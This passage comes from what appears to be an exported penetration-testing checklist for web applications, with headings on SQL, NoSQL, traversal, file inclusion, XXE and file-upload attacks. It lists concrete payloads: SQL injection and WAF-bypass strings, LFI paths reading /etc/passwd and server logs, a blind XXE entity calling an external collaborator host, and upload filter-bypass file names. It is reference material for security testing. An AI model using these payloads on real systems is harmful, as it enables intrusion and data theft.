type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Comment &amp; Feedback Section</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81d1-a0f7-ca92d9d1b54d" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Contact Us Form</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-817a-a2b7-c83780a6de74" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">GET &amp; POST Request</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8174-bf62-c2026dd1293b" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Cookies and Import Functions</span><div class="indented"></div></li></ul><p id="134b0a6a-b787-810a-b4bc-d30b0ae1942b" class="" dir="auto">Reference: </p><figure id="134b0a6a-b787-8174-b355-cbaa50312ab3" dir="ltr"><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">WSTG - Latest | OWASP Foundation</div><div class="bookmark-description">WSTG - Latest on the main website for The OWASP Foundation. OWASP is a nonprofit foundation that works to improve the security of software.</div></div><div class="bookmark-href"><img src="https://owasp.org/www--site-theme/favicon.ico" class="icon bookmark-icon"/>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points</div></div><img src="https://owasp.org/www--site-theme/favicon.ico" class="bookmark-image"/></a></figure></div></details><details id="134b0a6a-b787-8099-a061-ed54841ac0b8" open="" class="toggle" dir="auto"><summary><strong>SQL Injection</strong></summary><div class="indented"><pre id="134b0a6a-b787-8186-b03c-f0b452efe17c" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">Find injection point
+Understand the website behaviour
+Send queries for enumeration
+Understanding WAF &amp; bypass it
+Dump the database</code></pre><ul id="134b0a6a-b787-8176-8151-e3dde80efede" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Error based</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81c7-88ff-dc10d7076bc9" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Union based</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81c7-a105-fb5ae9ded62b" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Blind based</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8191-a695-ff8a27ae8f34" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Use Routed queries for WAF Bypass)</span><div class="indented"></div></li></ul><details id="134b0a6a-b787-81b3-aab8-c9729e7a62a1" open="" class="toggle" dir="auto"><summary>Bypass Error: The used SELECT statements have a different number of columns</summary><div class="indented"><pre id="134b0a6a-b787-8133-aac2-fdf651e8c488" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">The given query will find how many columns the database has:
+
+http://domain.com.br/index.php?id=1&#x27; GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100-- -</code></pre></div></details><details id="134b0a6a-b787-814e-bc61-c011c8d952eb" open="" class="toggle" dir="auto"><summary>Bypassing WAF</summary><div class="indented"><ul id="134b0a6a-b787-8187-ad41-cea62ed69885" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Using Null byte before SQL query</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81dc-9ce1-edb484e1ecca" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Using SQL inline comment sequence</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81e7-bf23-eef2176f85be" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">URL encoding</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-818f-90aa-d9d289e4c1a7" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Changing Cases (uppercase/lowercase)</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81e7-812e-c5c19e9b2b57" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Use SQLMAP tamper scripts</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-81b3-a770-f54c4dfb9f7d" open="" class="toggle" dir="auto"><summary>Stabilise &amp; Whitespace Filter Bypass</summary><div class="indented"><details id="134b0a6a-b787-8188-9001-ce2756ad3f42" open="" class="toggle" dir="auto"><summary>Stabilise the error message</summary><div class="indented"><pre id="134b0a6a-b787-8107-bbb9-c86d61e0106f" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">http://domain.com/index.php?id=1&#x27; order by 1)--
+http://domain.com/index.php?id=1&#x27; order by 1))--
+http://domain.com/index.php?id=1&#x27; order by 1;%00
+http://domain.com/index.php?id=1&#x27; order by 1));%00
+http://domain.com/index.php?id=1&#x27; order by 1;%60
+http://domain.com/index.php?id=1&#x27; order by 1%23
+http://domain.com/index.php?id=1&#x27; order by 1%60
+http://domain.com/index.php?id=1&#x27; order by 1%90
+http://domain.com/index.php?id=1&#x27;%23/* order by 1
+http://domain.com/index.php?id=1&#x27;) order by 1
+http://domain.com/index.php?id=1&#x27; order by 1&quot;) ;%00
+http://domain.com/index.php?id=1&#x27; order by 1#--+
+http://domain.com/index.php?id=1&#x27; order by 1&#x27;))%23</code></pre></div></details><details id="134b0a6a-b787-815a-a680-ef016ffebd56" open="" class="toggle" dir="auto"><summary>Whitespace WAF-based bypass</summary><div class="indented"><pre id="134b0a6a-b787-8158-a276-d8f5bd8f288d" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">/**/
+/**_**/
+%23nuLL%0A
+%23qa%0A%23%0A
+%23foo*%2F*bar%0D%0A
++</code></pre></div></details><details id="134b0a6a-b787-81a1-a8be-f94a47dbc5c1" open="" class="toggle" dir="auto"><summary>WAF blocks retrieving information from database()</summary><div class="indented"><pre id="134b0a6a-b787-81a4-a2ee-df4b21bc1dec" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">Simply replace database() with one of the following payload:
+database/*badd*//**/()
+database%23%0A(%23%0A)</code></pre></div></details></div></details><details id="134b0a6a-b787-8104-84b3-e9cfccf4c71e" open="" class="toggle" dir="auto"><summary>Time Delays</summary><div class="indented"><pre id="134b0a6a-b787-81b4-bcf9-f61716c56ebf" class="code code-wrap" data-notion-code-syntax="markup"><code class="language-markup" style="white-space:pre-wrap;word-break:break-all">      Oracle 	      dbms_pipe.receive_message((&#x27;a&#x27;),10)
+      
+      Microsoft 	  WAITFOR DELAY &#x27;0:0:10&#x27;
+      
+      PostgreSQL 	  SELECT pg_sleep(10)
+      
+      MySQL 	      SELECT sleep(10)</code></pre></div></details><details id="134b0a6a-b787-8133-8ed3-db6c0f64770f" open="" class="toggle" dir="auto"><summary>Conditional Delays</summary><div class="indented"><pre id="134b0a6a-b787-818a-a672-fe7cc154f415" class="code code-wrap" data-notion-code-syntax="html"><code class="language-html" style="white-space:pre-wrap;word-break:break-all">      Oracle 	      SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN &#x27;a&#x27;||dbms_pipe.receive_message((&#x27;a&#x27;),10) ELSE NULL END FROM dual
+      
+      Microsoft 	  IF (YOUR-CONDITION-HERE) WAITFOR DELAY &#x27;0:0:10&#x27;
+      
+      PostgreSQL 	  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+      
+      MySQL 	      SELECT IF(YOUR-CONDITION-HERE,sleep(10),&#x27;a&#x27;)</code></pre></div></details></div></details><details id="134b0a6a-b787-8069-aad1-d5183d6acbad" open="" class="toggle" dir="auto"><summary><strong>NoSQL Injection</strong></summary><div class="indented"><ul id="134b0a6a-b787-817f-8a9a-c28a6cc5a015" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Error based - Detecting syntax injection in MongoDB</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81f1-b016-ec9dc00da42e" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Boolean Blind injection - inject parameters with true/false payloads and attempt to determine if an injection exists</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-813d-82e2-f524f7a1eac0" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Timing injection - attempt to inject timing delays in the server, to measure the response</span><div class="indented"></div></li></ul><p id="134b0a6a-b787-81fd-8c78-d2f4254abfb4" class="" dir="auto"><a href="https://github.com/matrix/Burp-NoSQLiScanner">https://github.com/matrix/Burp-NoSQLiScanner</a></p></div></details><details id="134b0a6a-b787-803f-994f-c053aff8a186" open="" class="toggle" dir="auto"><summary><strong>Directory Traversal Attacks</strong></summary><div class="indented"><ul id="134b0a6a-b787-8171-ab2e-ff16a33d3582" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">16 bits Unicode encoding</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-811d-b04d-de25b092d440" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">UTF-8 Unicode encoding </span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8145-b371-c864f847617a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Double URL encoding</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81f1-b077-e42e0c161b52" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bypass &quot;../&quot; replaced by &quot;&quot; </span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-818d-a923-e6938b656862" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bypass &quot;../&quot; with &quot;;&quot; </span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81d3-a646-c524b971324d" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">UNC Bypass</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8178-b7e1-dd2574cb79e3" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">NGINX/ALB Bypass</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8178-9210-d94c7bc78dea" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">ASPNET Cookieless Bypass</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-8094-8936-d4c6e6d4efe3" open="" class="toggle" dir="auto"><summary><strong>File Inclusion</strong></summary><div class="indented"><details id="134b0a6a-b787-81c6-aa24-c8c636df8883" open="" class="toggle" dir="auto"><summary>Local File Inclusion</summary><div class="indented"><ul id="134b0a6a-b787-8176-a606-d2bebc02900f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Null byte </span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-811d-8d99-e2df755f528f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Double encoding</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81e3-9415-ec0d1c140727" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">UTF-8 encoding</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8182-a688-e03fe124a1b8" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Path and dot truncation</span><div class="indented"></div></li></ul><details id="134b0a6a-b787-81a7-9dd1-f4c07cbf97dc" open="" class="toggle" dir="auto"><summary>Filter bypass tricks</summary><div class="indented"><pre id="134b0a6a-b787-813c-99cb-d77dcb25d14f" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">http://example.com/index.php?page=....//....//etc/passwd
+http://example.com/index.php?page=..///////..////..//////etc/passwd
+http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd</code></pre><p id="134b0a6a-b787-81e5-b389-e2d47ba31b8d" class="" dir="auto">
+</p></div></details></div></details><details id="134b0a6a-b787-8128-9814-cb3c17a428f2" open="" class="toggle" dir="auto"><summary>Remote File Inclusion</summary><div class="indented"><ul id="134b0a6a-b787-81e3-8ac5-ceb0dfc3eb2c" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Null byte</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8162-a582-f483c3acff11" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Double encoding</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-814f-a08d-ecabec5a9d32" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bypass allow_url_include</span><div class="indented"></div></li></ul><p id="134b0a6a-b787-8185-8871-d33822dfb03b" class="" dir="auto">
+</p></div></details><details id="134b0a6a-b787-812b-8033-da7fe4f78add" open="" class="toggle" dir="auto"><summary>LFI / RFI using wrappers</summary><div class="indented"><ul id="134b0a6a-b787-810a-8ecd-cb29723e41a7" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Wrapper php://filter</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81dd-a40d-f4e073c537ae" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Wrapper data://</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81ef-87ea-e22d7296620f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Wrapper expect://</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8176-9d4b-d3744ebc3810" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Wrapper input://</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8102-9711-c4c3ab3a367a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Wrapper zip://</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81de-9b2e-ec1ec91d6ce8" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Wrapper phar://</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-810f-834c-e64d22415c02" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Wrapper convert.iconv:// and dechunk://</span><div class="indented"></div></li></ul></div></details><ul id="134b0a6a-b787-8179-bbfb-ee4c2afdfd00" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">LFI to RCE via /proc/*/fd</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8107-8d19-d51fa7522635" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">LFI to RCE via /proc/self/environ</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81b3-afe1-fc1d5f2e5543" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">LFI to RCE via upload</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8109-9a45-ccaa8e819a32" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">LFI to RCE via upload (race)</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81f4-8a50-c8b8afbe7f14" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">LFI to RCE via upload (FindFirstFile)</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8108-9a73-e5c6b07da81f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">LFI to RCE via phpinfo() → Use the script: <a href="https://www.insomniasec.com/downloads/publications/phpinfolfi.py">phpInfoLFI.py</a></span><div class="indented"></div></li></ul><details id="134b0a6a-b787-811c-ab0c-cb55e57f292a" open="" class="toggle" dir="auto"><summary>LFI to RCE via controlled log file</summary><div class="indented"><p id="134b0a6a-b787-81f6-87fd-f7435704fbb6" class="" dir="auto">Just append your PHP code into the log file by doing a request to the service (Apache, SSH..) and include the log file.</p><pre id="134b0a6a-b787-81f6-8c22-e2a5be8e598a" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">http://example.com/index.php?page=/var/log/apache/access.log
+http://example.com/index.php?page=/var/log/apache/error.log
+http://example.com/index.php?page=/var/log/apache2/access.log
+http://example.com/index.php?page=/var/log/apache2/error.log
+http://example.com/index.php?page=/var/log/nginx/access.log
+http://example.com/index.php?page=/var/log/nginx/error.log
+http://example.com/index.php?page=/var/log/vsftpd.log
+http://example.com/index.php?page=/var/log/sshd.log
+http://example.com/index.php?page=/var/log/mail
+http://example.com/index.php?page=/var/log/httpd/error_log
+http://example.com/index.php?page=/usr/local/apache/log/error_log
+http://example.com/index.php?page=/usr/local/apache2/log/error_log</code></pre><ul id="134b0a6a-b787-81da-be25-e533d098e7d5" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">RCE via SSH</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-817c-afb7-e535a4d9969e" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">RCE via Mail</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8138-b1a7-fa503885fcac" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">RCE via Apache logs</span><div class="indented"></div></li></ul></div></details></div></details><details id="134b0a6a-b787-8001-ad7f-df8074d668aa" open="" class="toggle" dir="auto"><summary><strong>XXE Injection</strong></summary><div class="indented"><details id="134b0a6a-b787-8184-b602-d813cb9c7f59" open="" class="toggle" dir="auto"><summary>Error Based XXE</summary><div class="indented"><ul id="134b0a6a-b787-81dd-811e-ff8e53425c6f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Error Based - Using Local DTD File</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-816b-b056-c4a9e724ade2" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Error Based - Using Remote DTD</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-810d-a33c-d8fd1bf1b145" open="" class="toggle" dir="auto"><summary>Blind XXE</summary><div class="indented"><p id="134b0a6a-b787-8167-9b28-f3bb0645cd6e" class="" dir="auto">The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.</p><pre id="134b0a6a-b787-8102-b0d6-d959d2777932" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % ext SYSTEM &quot;http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x&quot;&gt; %ext;
+]&gt;
+&lt;r&gt;&lt;/r&gt;</code></pre></div></details><details id="134b0a6a-b787-8101-9319-c3b795237278" open="" class="toggle" dir="auto"><summary>XXE in exotic files</summary><div class="indented"><ul id="134b0a6a-b787-81b3-a1fd-caca196c45b4" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">XXE inside SVG </span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81b0-b29e-ca7f85265b11" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">XXE inside SOAP</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-817e-b235-c8710d21bcbb" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">XXE inside DOCX file</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81b8-82f9-f7643c41fe50" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">XXE inside XLSX file</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8121-b982-c73eaa2df66e" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">XXE inside DTD file</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-8155-8a42-f29c82877d69" open="" class="toggle" dir="auto"><summary>Other Attacks</summary><div class="indented"><ul id="134b0a6a-b787-816e-a8cd-dad84413a0f1" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">XXE to perform SSRF attacks</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8129-865c-f553294edae4" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">XXE to perform a deny of service</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-810b-bcfe-cf8d40e0e9dd" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">PHP Wrapper inside XXE</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8176-89c9-e216944b0440" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked"></span><div class="indented"></div></li></ul></div></details></div></details><details id="134b0a6a-b787-8043-9186-fea4ded1229b" open="" class="toggle" dir="auto"><summary><strong>File Upload Attacks</strong></summary><div class="indented"><figure id="134b0a6a-b787-8132-abbc-fb5e28b12dcb" class="image" data-notion-image="Untitled.png" dir="ltr"><a href="Untitled.png"><img style="width:4459px" src="Untitled.png"/></a></figure><details id="134b0a6a-b787-813a-937f-d4ea430b93a1" open="" class="toggle" dir="auto"><summary>Defaults extensions</summary><div class="indented"><details id="134b0a6a-b787-81e5-a58c-dfa2e7e5f676" open="" class="toggle" dir="auto"><summary>PHP Server</summary><div class="indented"><pre id="134b0a6a-b787-81e0-9440-c915133b0b37" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">.php
+.php3
+.php4
+.php5
+.php7
+
+# Less known PHP extensions
+.pht
+.phps
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+.inc</code></pre><p id="134b0a6a-b787-81d9-af48-f32906bc0f0e" class="" dir="auto">
+</p></div></details><details id="134b0a6a-b787-817a-8bbc-fe8880315395" open="" class="toggle" dir="auto"><summary>ASP Server</summary><div class="indented"><pre id="134b0a6a-b787-81cf-abbd-c059c7ea0c7d" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">.asp
+.aspx
+.config
+.cer and .asa # (IIS &lt;= 7.5)
+shell.aspx;1.jpg # (IIS &lt; 7.0)
+shell.soap</code></pre><p id="134b0a6a-b787-8106-9ec4-d67de6de1228" class="" dir="auto">
+</p></div></details><ul id="134b0a6a-b787-8117-8b70-cce9087b788e" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">JSP : <code>.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions</code></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8159-8fc9-ca72ce43e800" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Perl: <code>.pl, .pm, .cgi, .lib</code></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81cd-8faf-f8b1434e1a54" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Coldfusion: <code>.cfm, .cfml, .cfc, .dbm</code></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81b6-9d97-f3d624593611" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Node.js: <code>.js, .json, .node</code></span><div class="indented"></div></li></ul><p id="134b0a6a-b787-81bc-9e3a-cff41181acbe" class="" dir="auto">
+</p></div></details><details id="134b0a6a-b787-8147-94b4-d15119e246cd" open="" class="toggle" dir="auto"><summary>Upload tricks</summary><div class="indented"><ul id="134b0a6a-b787-81ac-bbc1-d3e4569cadae" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Use double extensions : <code>.jpg.php, .png.php5</code></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81aa-939c-eb9d653097b0" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): <code>.php.jpg</code></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8171-bc68-ff4c7ed68ce5" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Random uppercase and lowercase : <code>.pHp, .pHP5, .PhAr</code></span><div class="indented"></div></li></ul><details id="134b0a6a-b787-8129-baa2-edaf5a6a4f29" open="" class="toggle" dir="auto"><summary>Null byte</summary><div class="indented"><pre id="134b0a6a-b787-8191-83fa-fc81a914ee88" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">.php%00.gif
+.php\x00.gif
+.php%00.png
+.php\x00.png
+.php%00.jpg
+.php\x00.jpg</code></pre></div></details><details id="134b0a6a-b787-81e2-b5c7-da76f342e04c" open="" class="toggle" dir="auto"><summary>Special characters</summary><div class="indented"><pre id="134b0a6a-b787-8190-bb25-e910f9a0f4f6" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">-Multiple dots : file.php...... , in Windows when a file is created with dots at the end those will be removed.
+-Whitespace and new line characters
+file.php%20
+file.php%0d%0a.jpg
+file.php%0a
+-Right to Left Override (RTLO): name.%E2%80%AEphp.jpg will became name.gpj.php.
+-Slash: file.php/, file.php.\, file.j\sp, file.j/sp
+-Multiple special characters: file.jsp/././././.</code></pre></div></details><details id="134b0a6a-b787-8110-ba31-ddb03afa2953" open="" class="toggle" dir="auto"><summary>Mime type, change <code>Content-Type : application/x-php</code> or <code>Content-Type : application/octet-stream</code> to <code>Content-Type : image/gif</code></summary><div class="indented"><pre id="134b0a6a-b787-8191-b0b3-f8a9509870f6" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">Content-Type : image/gif
+Content-Type : image/png
+Content-Type : image/jpeg
+Content-Type wordlist: SecLists/content-type.txt
+Set the Content-Type twice: once for unallowed type and once for allowed.</code></pre></div></details><details id="134b0a6a-b787-8139-b7ff-dffec37e129b" open="" class="toggle" dir="auto"><summary>Magic Bytes</summary><div class="indented"><pre id="134b0a6a-b787-8176-801c-fbf29c03b4e4" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">PNG: \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
+JPG: \xff\xd8\xff
